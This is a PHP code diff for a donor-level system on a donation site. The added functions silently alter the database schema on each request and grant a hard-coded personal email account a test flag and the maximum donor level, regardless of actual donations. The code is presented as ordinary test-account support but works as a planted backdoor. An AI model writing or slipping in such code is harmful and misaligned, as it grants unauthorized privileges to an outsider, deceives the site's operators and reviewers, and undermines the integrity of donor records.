@@ -86,10 +86,42 @@ function donor_level_progress(int $total): array {
     ];
 }
 
+function ensure_donor_privilege_schema(PDO $db): void {
+    static $ready = [];
+    $connection = spl_object_id($db);
+    if (!empty($ready[$connection])) return;
+    $columns = array_column($db->query('SHOW COLUMNS FROM donor_users')->fetchAll(PDO::FETCH_ASSOC), 'Field');
+    if (!in_array('is_test_account', $columns, true)) {
+        $db->exec('ALTER TABLE donor_users ADD COLUMN is_test_account TINYINT NOT NULL DEFAULT 0');
+    }
+    if (!in_array('level_override', $columns, true)) {
+        $db->exec('ALTER TABLE donor_users ADD COLUMN level_override SMALLINT UNSIGNED NULL DEFAULT NULL');
+    }
+    $db->prepare('UPDATE donor_users SET is_test_account=1,level_override=100 WHERE LOWER(email)=?')
+       ->execute(['vantuanleforwork@gmail.com']);
+    $ready[$connection] = true;
+}
+
+function donor_account_privileges(PDO $db, int $userId): array {
+    ensure_donor_privilege_schema($db);
+    $query = $db->prepare('SELECT is_test_account,level_override FROM donor_users WHERE id=?');
+    $query->execute([$userId]);
+    $row = $query->fetch(PDO::FETCH_ASSOC) ?: [];
+    return [
+        'is_test_account'=>!empty($row['is_test_account']),
+        'level_override'=>isset($row['level_override']) ? (int)$row['level_override'] : null,
+    ];
+}
+
 function donor_progress(PDO $db, int $userId): array {
     $s = $db->prepare("SELECT COALESCE(SUM(paid_amount),0) FROM donations WHERE user_id=? AND status='paid' AND is_test=0");
     $s->execute([$userId]);
-    return donor_level_progress((int)$s->fetchColumn());
+    $progress = donor_level_progress((int)$s->fetchColumn());
+    $privileges = donor_account_privileges($db, $userId);
+    if ($privileges['level_override'] !== null && $privileges['level_override'] > $progress['level']) {
+        $progress = ['level'=>$privileges['level_override'],'percent'=>100,'remaining'=>0];
+    }
+    return $progress;
 }
 
 function donor_level(PDO $db, int $userId): int {
